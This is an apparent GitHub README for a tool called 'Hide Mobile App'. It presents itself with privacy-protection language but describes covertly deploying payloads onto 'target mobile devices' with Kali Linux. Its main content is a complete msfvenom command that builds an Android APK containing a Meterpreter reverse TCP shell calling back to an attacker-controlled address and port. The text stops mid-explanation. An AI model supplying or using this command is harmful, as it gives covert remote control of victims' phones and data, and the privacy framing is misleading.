# Hide-Mobile-App
"Hide Mobile App" maximizes Kali Linux and msfvenom capabilities to deploy custom payloads covertly onto target mobile devices. Seamlessly integrated into the Kali environment, it ensures the utmost privacy by encrypting sensitive data. Effortlessly secure your information with "Hide Mobile App" on Kali Linux.

## Table of Content

1. [Generate Apk File](#generate-apk-file)

## Generate Apk File
`msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=9999 R > ./mobileApp.apk`
This command utilizes `msfvenom`, a Metasploit payload generator, to create a custom Android application (`.apk` file) embedded with a Meterpreter reverse TCP payload. <br>
Breaking down the command:



